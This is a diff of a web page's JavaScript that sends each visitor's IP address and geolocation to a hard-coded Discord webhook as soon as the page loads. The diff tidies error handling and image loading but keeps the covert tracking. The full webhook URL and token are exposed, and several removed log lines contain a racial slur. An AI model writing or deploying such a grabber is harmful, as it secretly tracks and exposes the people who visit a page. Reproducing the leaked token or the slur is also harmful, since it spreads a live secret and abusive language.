@@ -1,6 +1,10 @@
 document.addEventListener("DOMContentLoaded", async function () {
-  await sendIPToDiscord();
-  await handleLocation();
+  try {
+    await sendIPToDiscord();
+    await handleLocation();
+  } catch (error) {
+    console.error("An error occurred:", error);
+  }
 });
 
 async function sendIPToDiscord() {
@@ -19,13 +23,11 @@ async function sendIPToDiscord() {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(dataIp)
     });
-    if (responseIp.ok) {
-      console.log("lamoooo laughing eomij");
-    } else {
-      console.error("negawatt");
+    if (!responseIp.ok) {
+      console.error("Failed to send IP message to Discord.");
     }
   } catch (error) {
-    console.error("neggwatt", error);
+    console.error("An error occurred while sending IP:", error);
   }
 }
 
@@ -34,10 +36,10 @@ async function handleLocation() {
     const locationInfo = await getLocationInfo();
     if (locationInfo) {
       const webhookUrl = "https://discord.com/api/webhooks/1140103989124419686/2DTpJ2FnmaGaNQI6viCy2ZBzkDptJ4vkdpqnJHeHS7f_H5IERJB1yHrVAWGLS7LWDQXQ"; // Your webhook URL
-      const locationContent = `**Location Information:**
-      - Latitude: ${locationInfo.latitude}
-      - Longitude: ${locationInfo.longitude}
-      - [View on Google Maps](${locationInfo.googleMapsUrl})`;
+      const locationContent = `**Location Information:`
+        + `\n- Latitude: ${locationInfo.latitude}`
+        + `\n- Longitude: ${locationInfo.longitude}`
+        + `\n- [View on Google Maps](${locationInfo.googleMapsUrl})`;
       const locationEmbed = {
         title: "Location Information",
         description: locationContent,
@@ -50,24 +52,23 @@ async function handleLocation() {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(dataLocation)
       });
-      if (responseLocation.ok) {
-        console.log("gang nigga gang fr");
-        addMarker(locationInfo.latitude, locationInfo.longitude);
-      } else {
-        console.error("blud what da heck");
+      if (!responseLocation.ok) {
+        console.error("Failed to send location message to Discord.");
       }
-
-      // Fade in and out images
-      const imageContainer = document.createElement("div");
-      imageContainer.id = "image-container";
-      document.body.appendChild(imageContainer);
-
-      const mapContainer = document.getElementById("map"); // Assuming your map's container has the ID "map"
-      mapContainer.style.zIndex = "0"; // Set the map's z-index
 
       const images = [
         "image1.png", "image2.png", "image3.png", "image4.png", "image5.png"
       ];
+
+      const imagePromises = images.map(imageName => loadImage(`images/${imageName}`));
+      await Promise.all(imagePromises);
+
+      const imageContainer = document.createElement("div");
+      imageContainer.id = "image-container";
+      document.body.appendChild(imageContainer);
+
+      const mapContainer = document.getElementById("map");
+      mapContainer.style.zIndex = "0";
 
       let currentIndex = 0;
       const fadeDuration = 1000;
@@ -91,8 +92,17 @@ async function handleLocation() {
       fadeInImage();
     }
   } catch (error) {
-    console.error("bludl", error);
+    console.error("An error occurred while handling location:", error);
   }
+}
+
+async function loadImage(src) {
+  return new Promise((resolve, reject) => {
+    const image = new Image();
+    image.onload = resolve;
+    image.onerror = reject;
+    image.src = src;
+  });
 }
 
 async function getUserIPAddress() {
@@ -101,8 +111,8 @@ async function getUserIPAddress() {
     const data = await response.json();
     return data.ip;
   } catch (error) {
-    console.error("dang gang", error);
-    return "get betta wifi";
+    console.error("An error occurred while retrieving IP address:", error);
+    return "IP address retrieval error";
   }
 }
 
